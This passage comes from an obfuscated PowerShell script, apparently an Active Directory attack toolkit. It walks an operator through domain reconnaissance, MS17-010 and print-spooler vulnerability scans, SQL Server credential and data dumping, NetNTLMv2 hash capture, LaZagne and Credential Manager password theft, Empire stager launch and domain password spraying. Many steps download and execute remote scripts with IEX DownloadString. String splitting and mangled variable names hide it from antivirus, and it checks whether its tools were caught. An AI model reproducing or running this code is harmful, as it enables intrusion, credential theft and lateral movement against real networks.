	        ${cO`mpU`TErS}  = breviaries -Unconstrained >> "$currentPath\DomainRecon\Unconstrained_Systems.txt"
            ${u`sErs}  = prostituted -AllowDelegation -AdminCount >> "$currentPath\DomainRecon\AllowDelegationUsers.txt"
	        
            Write-Host -ForegroundColor yEllOw ('Ide' + 'nt' +  'ify' +  ' kerbe' + 'r'+ 'os' +' a'  +  'nd pa'+  'ssword ' +'pol'+'icy' + '..'  )
	        ${doMa`INPoli`Cy} =   forsakes -Policy DOMain
            ${d`O`MaI`NpOlICY}."K`eR`Berosp`OLI`cY" >> "$currentPath\DomainRecon\Kerberospolicy.txt"
            ${d`O`M`AInPoLiCy}."sYs`TEM`AC`CesS" >> "$currentPath\DomainRecon\Passwordpolicy.txt"
	        
            Write-Host -ForegroundColor yeLLoW ('Searching fo'+'r Sys'  +'t' +'ems we ' + 'ha'+ 've' +' RD'  + 'P'+  ' '+'acce' + 's' + 's to'+ '.'+ '.'  )
	        rewires -LocalGroup Rdp -Identity   >> "$currentPath\DomainRecon\RDPAccess_Systems.txt" 
	        
	        ${SE`s`SiOn}   =  Read-Host -Prompt ('Do '+  'y'  + 'ou'+  ' want to s' +'ear'+  'c' +'h for '  +  'p'  +'ot'+  'ential s'  +  'ensiti' +  'v'  + 'e'  +' domai'  +  'n s'  +  'har'+ 'e fil'+  'e'+'s - can tak'  +'e' +  ' a '  +'while? (ye' + 's/' +'no' + ')'  )
            if (  ${se`Ssi`on} -eq (  'y' +  'es' ) -or ${S`eSSI`ON} -eq "y" -or ${s`ESS`IOn} -eq ('Y' + 'es' ) -or ${s`eS`sIOn} -eq "Y" )
            {
	        	mangers >> "$currentPath\DomainRecon\InterestingDomainshares.txt"
	        }
            
            ${aCliG`hT}  =   Read-Host -Prompt ('Startin'  +  'g ACLAna'  + 'ly'+  's'+ 'is for Shadow'+ ' '+'A' +  'dmin dete'  +'ction'  + '? '  + '(' + 'yes' +  '/no)')
            if (  ${ac`lIghT} -eq ('y'+'es'  ) -or ${Acl`Ig`ht} -eq "y" -or ${A`cL`iGHT} -eq (  'Y'  +  'es' ) -or ${ACL`iGHt} -eq "Y"  )
            {
	    	    Write-Host -ForegroundColor yeLlOw ('Sta'  +'rting '+'A'  + 'CLAnaly'+'s'+'is for'  +' Shadow A' +'dm' + 'i'+'n '+  'd' +'e'  + 'tectio' + 'n:')
                invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/ACLight/master/ACLight2/ACLight2.ps1'');Start-ACLsAnalysis;Write-Host -ForegroundColor Yellow ''Moving Files:'';mv C:\Results\ .\DomainRecon\;}'

	        }
            
	    
            ${POWer`s`qL} =   Read-Host -Prompt ('St'  +  'art ' +'Po'  +  'w'  +'erUpSQL Checks? '+'(yes/no'+ ')')
            if (  ${poWE`Rs`Ql} -eq (  'y'  +  'es' ) -or ${pOW`ers`qL} -eq "y" -or ${pO`we`R`SQl} -eq ('Y' + 'es'  ) -or ${pOWer`Sql} -eq "Y"  )
            {
	    	    powerSQL    
	        }

            ${spO`o`L`sCaN} = Read-Host -Prompt ( 'St' +  'art' +  ' MS-R'  + 'P'+ 'RN RPC Servi'  + 'c' +'e Sc' +'an?' + ' (y' +  'es/no)'  )
            if (  ${S`poO`LSc`AN} -eq (  'ye'+  's' ) -or ${S`pOoL`S`cAn} -eq "y" -or ${SPo`OlS`Can} -eq ( 'Y'  + 'es'  ) -or ${s`p`ooLs`caN} -eq "Y")
            {
	    	        Write-Host -ForegroundColor yeLlOw ( 'Checking'+ ' Domain' +' Controll' + 'e'+'rs for MS-RP' + 'RN' + ' RP' +'C-S'  + 'e' +'rv'  +'ic' + 'e! '+  'If it'  +'s ' +  'ava'  +  'il'+  'able'+', you ca'  + 'n' + ' '  +'nea'+ 'rl'+  'y do DCSy'  + 'nc.') 
                    iex ( new-object NeT.weBcLienT  )."DOwNlO`AD`S`TrInG"(  (  'https:'  + '//'  + 'raw.githubu'+ 'sercont' +  'ent.com/Secur'+'eT' + 'hi' +  's'  +'Shit/Sp' +  'ool'  +  'erScann' +'e'  + 'r/master/'+  'Spo'  +'o' +  'ler'+ 'Scan.ps1' )  )
                    ${DO`MC`O`NtrolS} =   terracing
                    foreach (  ${D`omC} in ${doMCoNtr`O`lS}."ipadDRe`ss" )
                    {
                        if (spoolscan -target ${d`omC} )
                        {
                            Write-Host -ForegroundColor YeLlOW (  'Fou'  + 'nd ' +  'v' + 'u' + 'lnerable DC.'  +  ' You can '+ 'ta'  +  'ke the DC'+  '-Has' +'h'+  ' for S'  +  'MB-Relay attacks'  +  ' ' +'no' +'w' )
                            echo "$domc" >> "$currentPath\DomainRecon\MS-RPNVulnerableDC_$domc.txt"
                        }
                    }
		    ${ot`HE`RsyS`TEms}  =  Read-Host -Prompt ( 'Start M'  + 'S-RPR'+'N RP' +  'C Service Sc' + 'an for oth'  +'er ' +'act' +'i'  + 've '+'Window'+ 's Serve'+'rs i'  +'n the dom'+ 'a' + 'in? (y'  + 'es/no)')
            	    if ( ${oTH`e`RSyS`TeMS} -eq (  'y'  +'es') -or ${OthERSYST`E`mS} -eq "y" -or ${OT`H`ERsy`s`TEmS} -eq (  'Ye'+'s' ) -or ${otH`Ers`Ys`Te`ms} -eq "Y")
                    {
		    	Write-Host -ForegroundColor YeLlOw (  'Searchin'+ 'g'  + ' for a' +  'ctive Servers in the' +  ' '+ 'domain,'  + ' ' +'t' +'hi'+ 's'+ ' ca' +'n tak'+'e '+  'a wh'  +'ile depe'  + 'nding on the '+'d'+'omain' + ' '+  's'  + 'i'+  'z' + 'e'  )
		    	${Ac`T`IV`ESeR`VErs}  = breviaries -Ping -OperatingSystem (  'W' + 'indow'+ 's Server*' )
			foreach (  ${a`c`SERveR} in ${act`i`VesE`RvErs}."Dn`s`HoS`Tname")
                    	{
                        	if (  spoolscan -target ${AC`se`R`VeR})
                        	{
                            		Write-Host -ForegroundColor yElLoW ( 'Fou' +'nd '  +'vu' +  'lner' +  'able '+  'Serv' +  'e' +  'r '+ '- '+ ( '59'  +  'Va'+  'c'  + 'server. ')."r`Ep`lAcE"(  ( [ChaR]53+[ChaR]57  +[ChaR]86),'$' )  + 'Yo'+'u ' +'ca' +'n '+  'take' +' ' +  'the'+' ' + 'DC'  +  '-Hash '  +'f' +'or ' +'SMB' +  '-R' +'elay '  +  'attac' + 'ks'  +  ' '  +  'n' +  'ow' )
                            		echo "$acserver" >> "$currentPath\DomainRecon\MS-RPNVulnerableServers.txt"
                        	}
                    	}
		    }
                    
	        }
	    ${m`S1`710} =   Read-Host -Prompt ( 'Search for M'  +'S' +'17-1'+'0' + ' vu'  +  'l'  + 'nera'+ 'b'  +'le' + ' '  + 'Wi'+  'ndo'+ 'ws ' +'Se'+'rvers i'  + 'n the' +  ' domain' +  '? (yes/n' +  'o)'  )
            if (  ${mS`17`10} -eq ( 'y'+'es'  ) -or ${m`S1`710} -eq "y" -or ${MS1`7`10} -eq ( 'Y'  + 'es'  ) -or ${M`s`1710} -eq "Y")
            {
	    	MS17-10	    	
	    }
	    
	    ${DOM`AI`NSha`R`EpasS} = Read-Host -Prompt ( 'Check ' +'Domai'+'n Ne'+ 'twork-S'+'har'+'es fo' +  'r clea'  +'r'+ 'te'  +  'xt' +' passwords us'+  'ing pas'+  'shu' +'nt.e'+ 'xe? (yes' +  '/no)'  )
            if (  ${Do`mAINsh`Ar`e`Pass} -eq (  'ye'+'s') -or ${dO`mAI`NSh`ARE`PASs} -eq "y" -or ${d`omaINsHarePA`sS} -eq ( 'Ye'  +'s') -or ${domaInSH`AR`epAsS} -eq "Y" )
            {
                passhunt -domain ${tr`Ue}
            }
	    
            Write-Host -ForegroundColor YEllOw (  'Do' + 'wnl' + 'oading' +  ' ' + 'A'  +  'DR' +  'econ Scr' +'ipt:' )
            Invoke-WebRequest -Uri ( 'h' +  'ttps' +  '://' +'r' + 'aw.g' +  'it' +'hubu'  + 'ser'+'co'  +  'n'  + 't'  +'en' +'t.com/Se'+'cur' +'eThisShit/Cr' +'ed' + 's/'+ 'master' +  '/AD'+'Re'  + 'con.ps1') -Outfile "$currentPath\DomainRecon\ADrecon\recon.ps1"
            Write-Host -ForegroundColor YelLOW ('E' +'xe' +  'cuting' + ' ADRecon '+'Script:' )
            cmd /C STarT POWerShelL -Command {"$currentPath\DomainRecon\ADrecon\recon.ps1"}
}

function Ms17-10
{

    
    IEX (new-object NeT.WeBclIENt )."DownL`oA`d`striNG"(  (  'h'  +  't' +'tps://'+ 'raw.gi' + 't'  +  'hu'+'bu'  + 'ser'  +'c'+ 'ontent.com/Se'+'cureTh'  + 'is' +  'Shi' +'t/Creds/'  + 'maste'  +  'r/ms17-1'+'0'  +'.p'+'s1'  ) )
    IEX (New-Object nEt.weBCLiEnT)."D`oWnLO`ADs`TRing"( (  'ht' + 'tps://raw.g'+'i'+  'thubus' + 'e' +  'r' +  'cont'+'ent.com/SecureTh'+'isS'+  'hit/C'+'reds/'+'maste' + 'r/obfuscatedps/'  +  'vie'+ 'wdevobfs'+ '.ps1'))
    ${sERVer`S`yS`TE`MS}  =   Read-Host -Prompt ( 'Start MS17-10 Scan'+ ' fo'+  'r' +' Wi'  +  'ndow' + 's '  +'Serv'+'ers on'  + 'ly (a'+ 'lterna'+  'ti' + 'v'  +  'e'  +  'ly we '  +'c' + 'an '+'scan '  + 'all Ser'+'v'+  'e' +  'rs + Cl' +'i'+'e'  +'n'+ 'ts'  +  ' '  +  'bu'  +  't' +  ' t'+  'his ca'+ 'n '+'ta' +'k'  +  'e'+ ' '  +  'a while)?'+  ' (yes'  + '/no)'  )
    if ( ${sErVeR`s`yste`mS} -eq (  'ye' +  's'  ) -or ${S`e`RVErS`YSteMS} -eq "y" -or ${sErV`erSY`StEMs} -eq ('Y'+  'es'  ) -or ${sE`R`V`eR`SYsTems} -eq "Y" )
    {
	Write-Host -ForegroundColor yeLLOW (  'S'+'e'  + 'a' +  'r'  +  'ching for acti' + 've Ser'+ 've'+  'rs in the ' + 'do' +  'm'  +  'ai' +  'n, this ca'+ 'n take '  +'a while ' +  'depending o' +  'n '+'th'+ 'e '+'domain '  + 'size' )
	${A`CtI`VEs`ervErs}   =   breviaries -Ping -OperatingSystem (  'W'  + 'i'+  'n'+'d' +'ows Server*'  )
	foreach (${A`Cs`ErVER} in ${ac`TI`VeseRVe`Rs}."DnSH`Os`Tn`Ame"  )
        {
         	if (  Scan-MS17-10 -target ${ACsERv`er})
                {
                	Write-Host -ForegroundColor YeLlOw ('F'+ 'o'+'und '+'vu' + 'lner' +  'able '  +'Serve'+ 'r'+ ' '+  '- ' +  ('40Ga'+'c' +  'se'+ 'rver'+ '. '  )."rEPL`Ace"(  ([cHAr]52 + [cHAr]48 + [cHAr]71  ),'$')+ 'Just' +' '  +'Pw'  + 'n '  +'th'  +  'is '+ 's'  +'ys'+'tem!')
                        echo "$acserver" >> "$currentPath\Exploitation\MS17-10_VulnerableServers.txt"
                }
        }
    }
    else
    {
    	Write-Host -ForegroundColor yellOW ('Searc'+ 'hing every win' +  'dows '  + 'sys' +  'tem in '  +'th'  + 'e do' +  'main, t' + 'his'+  ' can' +  ' ' + 'take'  +' ' + 'a while depend'  +  'ing on the domain' +' size'  )
	${ACTiVes`Er`VERs} =  breviaries -Ping -OperatingSystem ('Windo' + 'ws*')
	foreach (  ${a`csERv`er} in ${ac`T`IV`eSeRvE`RS}."dns`hOStNA`Me"  )
        {
         	if (Scan-MS17-10 -target ${a`CsErvER})
                {
                	Write-Host -ForegroundColor YeLLow ('Foun'  + 'd '  +'vul' +'nera' + 'ble ' + 'S'  + 'y' + 'stem '+ '- ' +(  '{0}a'  +  'cs' +'erver. ' )  -f [chAr]36  +  'Just'  +' ' +  'Pw'+ 'n '+ 'i' +'t!' )
                        echo "$acserver" >> "$currentPath\Exploitation\MS17-10_VulnerableSystems.txt"
                }
        }
    }

}

function POWersQl
{

    
   
    Write-Host -ForegroundColor yElloW ('Sear'+'ching f'+ 'or SQL Se' + 'rver' + ' instances i'  +  'n the d' + 'oma'  +  'in'+':'  )
    iex (new-object nEt.wEbcLIENt)."down`LO`A`dstriNg"(( 'http'  + 's://raw.'+ 'git'  + 'hub'  + 'userco' + 'nte'+'nt.com/Se'+ 'cure' +'Thi'  +'sS'  +'hit/Cred' +  's/master/Pow'  +  'erUpSQL.p'+'s'+'1'  ) )
    Get-SQLInstanceDomain -Verbose >> "$currentPath\DomainRecon\SQLServers.txt"
    
    Write-Host -ForegroundColor YeLlOw ('C' +  'hecking l' +'ogin w' + 'ith' + ' '+ 't' + 'he '+  'current'  +' u' +  'ser'  +' Acc'  +  'ount'  +':'  )
    ${ta`R`GetS}   =  Get-SQLInstanceDomain -Verbose  | Get-SQLConnectionTestThreaded -Verbose -Threads 10   |   Where-Object {${_}."STa`TuS" -like (  'Acc' +'e' +  'ssi' +'ble'  )} 
    ${taR`g`ETS} >> "$currentPath\DomainRecon\SQLServer_Accessible.txt"
    ${tAR`G`ETS}."i`NSta`Nce" >> "$currentPath\DomainRecon\SQLServer_AccessibleInstances.txt"
    
    Write-Host -ForegroundColor yeLlOw ( 'Che' + 'cki'  +  'n' +  'g' + ' D' +  'ef' + 'ault Credentials for a'  +'ll In'  +  's'  +'tan'  +'c'  +'es:')
    Get-SQLInstanceDomain  |  Get-SQLServerLoginDefaultPw -Verbose >> "$currentPath\DomainRecon\SQLServer_DefaultLogin.txt"
    
    Write-Host -ForegroundColor yELloW (  'Dumping '+ 'Informati' +'on '+'and'  + ' Aud' + 'i'+ 'ti' +  'ng al'  +  'l acc' +  'esi'  + 'ble Databases:'  )
    foreach ( ${L`ine} in ${TaR`G`eTS}."InS`Ta`Nce" )
    {
        Get-SQLServerInfo -Verbose -Instance ${lI`Ne} >> "$currentPath\DomainRecon\SQLServer_Accessible_GeneralInformation.txt"
        Invoke-SQLDumpInfo -Verbose -Instance ${l`ine} ${Li`NE} >> "$currentPath\DomainRecon\SQLServer_Accessible_DumpInformation.txt"
        Invoke-SQLAudit -Verbose -Instance ${L`INe} >> "$currentPath\DomainRecon\SQLServer_Accessible_Audit_$Targets.Computername.txt"
        mkdir "$currentPath\DomainRecon\SQLInfoDumps"
        ${t`ARge`TS}   |   Get-SQLColumnSampleDataThreaded -Verbose -Threads 10 -Keyword (  'passw'+  'or'  +'d'  +',pas'  +  's,credi'+'t'+',ssn,'  + 'pwd') -SampleSize 2 -ValidateCC -NoDefaults >> "$currentPath\DomainRecon\SQLServer_Accessible_PotentialSensitiveData.txt" 
    }
    Write-Host -ForegroundColor yelLoW ( 'Moving CSV-Fil'+ 'es'+  ' to S'+'Q' +  'LInf'+'o' + 'Dum' + 'ps'+' folder:')
    move *.CSv "$currentPath\DomainRecon\SQLInfoDumps\"
    ${uNcP`ATh}  =  Read-Host -Prompt ('Execute UN' + 'C-Path Inj' +  'ection te'  + 'sts fo' + 'r ac'  + 'ces'  +'i'+ 'ble S' +'QL '  +  'Server'  +'s'+' '  + 'to gather some '  + 'Netn'  +'tlmv' + '2' +' Hashes? (yes/no)')
    if (${U`Ncp`AtH} -eq (  'y'  +  'es'  ) -or ${Un`c`path} -eq "y" -or ${uN`CPA`TH} -eq ( 'Y'  +  'es') -or ${U`NC`patH} -eq "Y")
    {
        ${R`E`sPondEr}   =  Read-Host -Prompt ( 'Do '  +'you ' + 'have Res' + 'ponder.py ru'+ 'n' +'n'  + 'i' +'ng o' +  'n a' +'not'  +'he'  + 'r'  + ' m'  +'a' +  'ch' +  'in'+  'e'  + ' i'+ 'n'+ ' thi'  +  's netw'  +'ork?'+  ' (If'  +  ' no'+'t '  +  'w' + 'e '  +'ca'  +  'n star' + 't'+ ' i'+ 'nveigh) -'+  ' (yes/no)'  )
        if (  ${RE`S`pONd`er} -eq (  'y' + 'es') -or ${RE`spONd`ER} -eq "y" -or ${rEs`p`ondeR} -eq (  'Ye' +  's') -or ${re`spo`N`DeR} -eq "Y" )
        {
            ${sm`BiP} = Read-Host -Prompt ( 'Pl'+  'e'  +  'ase en' +'t' +  'er ' +  'the ' + 'IP-Addr'+ 'es'  +'s' +  ' of'  +  ' t'+ 'h'  +'e has'+  'h captur'+'in'+  'g ' +'N'+  'etwor'+  'k In' + 'ter'+ 'face:'  )
        }
        else
        {
            ${S`MBIp}   =   Get-currentIP
            Inveigh
        }
	    Invoke-SQLUncPathInjection -Verbose -CaptureIp ${Smb`ip}."ip`V4a`dDRE`ss"."IPA`ddre`Ss"    
	}
    
	      
}

function GeT-CUrreNTip
{

    
    ${ipa`DdRe`SS} =   Get-NetIPConfiguration  | Where-Object {${_}."Ipv4dE`FA`ULTG`Atew`Ay" -ne ${n`ULL} -and ${_}."NEtA`DA`p`TeR"."stA`TUs" -ne ('Disc'  + 'onn' +  'e'+  'cted'  )}
    return ${Ip`Ad`dRESs}
}

function SHarPHOunD
{

    
    ${W`cL}  =   new-object sYStEm.Net.WEbcLIeNt
    ${w`CL}."Pro`XY"."crEDe`NtI`ALS" =    ( chIlDITem  vARiaBLe:BUe8T  ).VALUe::"DEfa`Ult`NeTwoR`kcReDeNT`ia`LS"
    ${cuRRE`Nt`p`AtH}  = (Get-Item -Path ((  '.{0}' )-f  [chaR]92) -Verbose  )."FUl`LnA`ME"
    pathcheck
    Invoke-WebRequest -Uri ('htt'  + 'ps' + '://git'+  'h' +'u'  +  'b.com/' +  'BloodHo'  +'u'  + 'ndAD/Bl'  +'oodHound/'+'ra'+'w/m'  +  'as'+  'ter/In'  +  'ge' +  'st'  +  'ors/Sh'  +  'a'  +'r' +'pHound.'+  'ex'+'e'  ) -Outfile "$currentPath\Domainrecon\Sharphound.exe"
    
    Write-Host -ForegroundColor yEllOW ('Runn'+ 'ing Sha'+'rp'  +'hound C' + 'o'+  'lle'  +  'c' + 'to'  +  'r: ')
    .\DomainRecon\Sharphound.exe -c alL

}

function PRIvEScMODuLES
{

    
    ${cU`RR`Ent`PatH}  = (Get-Item -Path (  ('.{0}') -F[chaR]92 ) -Verbose)."Fu`lLNA`me"
    pathcheck
    IEX (New-Object nET.webClienT)."dOWNlOAD`strI`Ng"( (  'h'  +'ttps' +'://'+ 'ra'+  'w.githubu'  +  'se'  +  'rc'+  'ont' +'en'  +  't.com/Secu'  + 'r' +  'eT'  +'hi' +'sShit/Creds/m'+  'ast'  +'er/ob' +'fus'+'cat'+'e'  +'dp'+ 's/'+  'l'  +'o'  +  'cksher.'  +  'ps1' ) )
    IEX (  New-Object Net.WEbclieNt  )."d`OWNLOad`StR`iNg"(  (  'ht'  + 'tps'  + ':'+'//r'+'aw.gith'  + 'ubuserconte'+'nt.'+'c'+ 'om/Sec'+  'ureTh' + 'isShit' +'/Cre'+ 'ds/master/obfusc' + 'atedps/U' +  'pP'  +'ower.p'  + 's1' ))
    IEX ( New-Object neT.WEbcLieNT  )."D`O`wNl`oaDsTrinG"(  ('h'  + 'ttp'+  's://raw' + '.githu' + 'bu'+  'se' +  'rcontent.com/S'+  'ecu'  +  'reT'+ 'hisShit/'+'Creds'  +'/master/ob' +'fuscated'  +  'ps/GP'  +'pass.ps1')  )
    IEX (New-Object nEt.weBclIeNt)."dowNlOaDST`Ri`NG"((  'h'  +'ttp' +  's:'  +  '/'+ '/'+  'raw.githubu'+'se' +'r'  + 'conten' + 't.com/Se'  +'c' +  'ure' +'Thi' +'sShit/'  + 'Creds'+  '/mas'  +'ter/obfus'+'c'  +'atedps/' + 'AutoGP.ps1')  )
    iex ( new-object NEt.WEBcLieNT  )."d`OW`NloaDstRiNg"(( 'https://r'+'aw.githu'  +'b'+'use'+'rcont'  + 'ent'  +'.'+ 'com/' +'Sec'+  'ur'+ 'eThisShi'+  't'+ '/Cred'+ 's/master/obfusca' +'te' +'dps/'  +'D' +  'um' +'p'  +  'WCM.ps1'  ))

    Write-Host -ForegroundColor YeLlow ('D'+  'umping Wi'  +'ndo'+  'ws ' +'Crede'  + 'ntial M'  +  'ana' + 'ger:')
    Invoke-WCMDump >> $cuRRentpAth\LocAlpRIVEsC\wCmCrEdeNtIals.txt

    Write-Host -ForegroundColor YeLLoW (  'G' +'etti' + 'n'  +'g Local'  + ' '+'Privilege E'  +  'scalation '+  'possib'  +'ilities:')

    Write-Host -ForegroundColor YELlOW ( 'Ge' +  't'+  'ting ' +  'GPPPasswords:'  )
    amazon >> $cUrreNtPath\locaLpRiVEsc\GpP_AutO.txt
    Shockley >> $cuRreNtPATh\LoCalpRiVEsC\GPP_passWoRdS.TxT

    Write-Host -ForegroundColor yelLow ( 'Loo' +  'k' + 'ing'  + ' for' +' Lo'+ 'cal Privil' + 'ege E'  + 'sc'+  'alation'+  ' po'+ 'ssibilitie'+'s:')
    families >> $CUrREnTpatH\loCaLprIvEsc\AlL_LOcALcHeCKs.TXt

    Write-Host -ForegroundColor yEllow ('Look'+ 'ing' +' for MS-Explo'+ 'its on' +  ' '  +  't' +  'hi'+'s lo'  +'ca'+  'l' + ' '  + 'sy'+'st'  +  'em for ' +'Pr' + 'ives'  +  'c:')
    proportioned >> $curRentPaTH\lOCaLPRIVEsc\sHerLock_vulnS.TXT
    
    iex (new-object NET.WebCLIENt)."dOWN`l`oAds`TRI`Ng"(  (  'htt'  +  'ps:/'+ '/raw'  +'.gi'  + 'th'  + 'ubuserconten' +  't.com/S' +  'ecu' +  'r'+'e' + 'T'+ 'hi'  +  'sShi'+'t/' + 'Cred'  + 's'+'/mast'+'er' +'/Ik' +  'ee' +  'x'  +'tChec' +  'k.ps1'  )  )
    Invoke-IkeextCheck >> "$currentPath\LocalPrivesc\IkeExtVulnerable.txt"
    
    ${SE`AR`CH} =  Read-Host -Prompt ( 'Sta'  + 'rt' +  ' J'+ 'u'  +'st Another Wind' + 'ow'+'s (Enu'+'m)'+' '  +'S'  +  'cript'+'? (ye'+ 's/n' +  'o)' )
    if (  ${Sear`Ch} -eq (  'ye'+'s') -or ${Se`ARcH} -eq "y" -or ${s`EARCH} -eq ( 'Ye'+ 's') -or ${s`Ea`RcH} -eq "Y" )
    {
        jaws
    }
}

function LaZAGNeModuLe
{
    
    
    ${currENTp`A`Th}   =  ( Get-Item -Path (( '.S'+  'DM' )."REp`laCe"('SDM',[sTring][cHAR]92) ) -Verbose)."fULLNa`me"
    pathcheck
    Invoke-WebRequest -Uri ('https://' +'github.co'+  'm/Al'+  'ess' +'andro'+ 'Z/'  +  'LaZa' +  'gne'  +'/r'  +'e'+  'l'+ 'ease'  +  's/'  +'download'+ '/2.3.'+'1/' +  'W'+  'i'+'n'+'do'  + 'ws.'  +'zip'  ) -Outfile $cuRrentpaTh\lAZaGNE.zip
    Unzip "$currentPath\Lazagne.zip" "$currentPath\Lazagne"
    Write-Host -ForegroundColor yELlOw (  'C'  +'heck'+ 'in'+  'g, ' +'i'  +'f'+ ' th' +  'e ' + 'fil' +'e'  +  ' was'+  ' killed by antiviru'  + 's:')
    if (  Test-Path $CuRreNTPATH\LaZAGne\wINdOWS\laZaGNE.EXe  )
    {
        Write-Host -ForegroundColor YEllOw (  'Not '+  'killed'  +  ', Execut'  + 'i' + 'ng:')
        ( "$currentPath\Lazagne\Windows\laZagne.exe "+ 'a' +  'll'  ) >> $curreNtPaTh\laZagnE\pasSWOrDs.tXT
        Write-Host -ForegroundColor yeLLoW (  'Re'+ 'sul'+  'ts ' +'sa'+'ved'  + ' '  +  't'  +'o '  + (  'FLPcurr'+ 'entPa' +'th0EsL'+  'aza'+'gn' +'e0EsPas'+ 's' +  'wor'+ 'ds.txt!' )."rEp`LA`ce"(  'FLP',[String][CHaR]36  )."r`ep`lAce"(  '0Es','\' )  )
    }
    else {Write-Host -ForegroundColor RED ('An' +  'tivirus ' + 'go' +'t i' +'t' +', t' +'ry an '  +  'obfuscated versio'+'n'+ ' o'  + 'r'+' RAM-'  +'Executio'  +  'n wi'+  't' + 'h Pupy:' )}
}

function LatMoV
{
    
    
    pathcheck
    ${cuR`R`enTpAth}   =  (  Get-Item -Path ((  '.Sdl'  )-rEplACe  ([Char]83  +  [Char]100+  [Char]108 ),[Char]92 ) -Verbose )."fuLLN`AMe"
    IEX ( New-Object nEt.weBcLienT)."Do`WNLO`A`DstR`iNg"( ('h' +'ttps://' + 'raw.g' +  'it'+  'hu'  +  'buserc'  +  'ontent.c' +'om' +  '/'+ 'Secur'+'eTh'+  'is' + 'Sh'+ 'it/' +'Creds'  + '/m' +'as' + 'ter/ob' + 'fuscat'  +  'edp'  +'s/masskitti' + 'e'  +'.'+  'p'+'s1'  ) )
    IEX (  New-Object neT.WEbCLIenT)."d`OwnL`O`ADStr`Ing"( ('https://'+'raw.gi'+'th' +  'ubus' + 'erc'+ 'onte'  +  'nt.com'+ '/'+ 'SecureThisShit' +'/Cre' +'ds/master/'  +  'D'+  'omainPass'+ 'word' + 'Spra' +'y.ps1'))
    IEX ( New-Object net.WEBclIent  )."DoWnLoA`dS`TriNG"((  'htt' +'ps'+ ':' +  '//r'+  'aw.g'+  'i'+ 'thubuser' +'content.'  +  'com/Secure' + 'This' +'Shit'  + '/Creds/'+  'maste'+'r/obfuscat'+'edps/view.ps1' ) )
    ${dOM`AiN_`NAmE}   =   Get-NetDomain
    ${Do`m`AIN}   =  ${dOMAin`_`NAme}."NA`mE"
    
    Write-Host -ForegroundColor YELLow ( 'Starti'  +'ng '+ 'Lateral Mo' +'vem'+ 'e'  +'nt' +' P'  + 'hase:' )

    Write-Host -ForegroundColor YELLOW ( 'Se' + 'arch'+ 'ing'+  ' for Domain '+ 'Systems' +  ' '  +  'we can pwn '  +'wi' +'th' +' a'  + 'dm'  + 'i' +'n rights'+', t'  +'his can'+  ' '+ 'take a'  + ' w'+  'hile de'  + 'pe'+  'nding on th'  +'e s' +'ize' + ' of you'+ 'r '  +'do' + 'main:')

    fuller >> $CuRRENTPAth\EXploiTAtIOn\LocaLAdmINACCeSs.TXt

    ${e`Xpl`OI`TdeCiS`iON}   =   Read-Host -Prompt (  'Do you' + ' '+'wa'  +'nt to Dump '+  'Credentials on a'+ 'll fo'  +'und Sy'+ 's'  +  't' + 'ems'  + ' or E' +'xe'+ 'cute' +  ' Emp' +  'i'  + 'r'  +  'e S'+'t'+'ager? ' +'(dump/empir'+'e'+  ')')
    if (${EXPlo`it`DeCisI`on} -eq ('dum' + 'p') -or ${ExplOI`TD`e`CiSi`ON} -eq (  'k'+'i' +'ttie') -or ${exP`loItDe`c`Is`iON} -eq ( 'C'+ 'redenti' +  'als'  )  )
    {
        
        ${Ma`s`skIttie}  = Read-Host -Prompt (  'Do '  +'yo' +  'u' +' w'  + 'ant to u' + 'se '+ 'Masskitt'+  'ie for all found'+' Sys' +'t'+  'em' + 's? (yes'+  '/'  + 'no'+  ')' )
        if (${massKi`T`TIe} -eq ('y'  + 'es' ) -or ${mASS`K`ITtIE} -eq "y" -or ${ma`Ssk`it`TiE} -eq ('Ye'+  's') -or ${mA`SSKiT`TiE} -eq "Y")
        {
           if ( Test-Path $curreNtpatH\eXPLoItaTIon\lOCALaDmInaCcess.Txt  )
           {
               bookmobile -sILeZZaOSNUwrt9 $CurRENtPATh\explOitaTion\localadMInaCcesS.txt >> $cuRrENtpAth\expLOITATion\PWNeDsYStEMS_CrEDEntiAls.tXt
           }
           else { Write-Host -ForegroundColor Red ('N' + 'o '  +'Systems with a'+  'dmin-Priv' + 'i'+ 'leg'  +'es f'+ 'ound i'+'n '+  'this dom'+'ain'  ) }
        }
    }
    elseif ( ${eXpl`o`iTde`cisION} -eq (  'e'  +  'mp'  + 'ire' ) -or ${EXP`lOi`TdecI`SI`ON} -eq (  'R' +  'AT'  ))
    {
        empirelauncher
    }
    
    ${Dom`AI`NSP`RaY}   =  Read-Host -Prompt ('Do yo'  +'u wa'+ 'nt to' + ' Spra' +  'y' + ' the Network '  +'wit'  + 'h prepared Cred'+'ential'  +'s? (ye'+'s/n' +  'o'+ ')')
    if (${D`oMAi`N`sPray} -eq (  'y' +  'es') -or ${DoM`AI`Ns`PrAY} -eq "y" -or ${do`MA`INS`PraY} -eq ( 'Y'  + 'es') -or ${d`O`mainsPray} -eq "Y")
    {

       if (  Test-Path $cUrreNTPATH\paSSlist.TXT  ) 
        {
            Invoke-DomainPasswordSpray -UserList $cUrreNTpaTH\DOMAInREcON\uSerliST.TXT -Domain ${d`OM`AIn_`Name}."N`AMe" -PasswordList $cuRrenTpAtH\PassLIsT.tXT -OutFile $CUrrEntPATH\exPLOITatIon\PWNED-cReDs_doMaiNpaSSworDspray.tXT
        }
        else 
        { 
           Write-Host -ForegroundColor rED ('The'  +'re is no passl'  + 'ist.txt Fi'  +  'le in' + ' '+'t'+ 'he cu'+'rrent fol'+  'de'  +  'r' )
           ${Pa`sSl`i`st}  = Read-Host -Prompt ( 'Plea'+  'se en' + 'ter one ' +'P'+  'asswor'+ 'd for Domai' +  'n' + 'Sp'  +'ray '+ 'manually:')
           ${paS`SL`Ist} >> $cURrentPAth\PaSsLISt.TXt
           Invoke-DomainPasswordSpray -UserList $CURReNtpath\dOmAINRecOn\usErlIST.tXT -Domain ${dom`AIN}."N`AmE" -PasswordList $currenTpath\PASSlIsT.Txt -OutFile $CurrenTpatH\exPLoITATIoN\PwnED-crEDs_DOmaINpaSSWORDsPrAY.txt  
        }
    }
}

function EMPIrELaUnChER
{
    ${C`UrR`eNTpATH}   =  (  Get-Item -Path (  ('.WNZ') -cRePlACE([ChaR]87  + [ChaR]78+  [ChaR]90 ),[ChaR]92) -Verbose)."fUll`NAmE"
    pathcheck
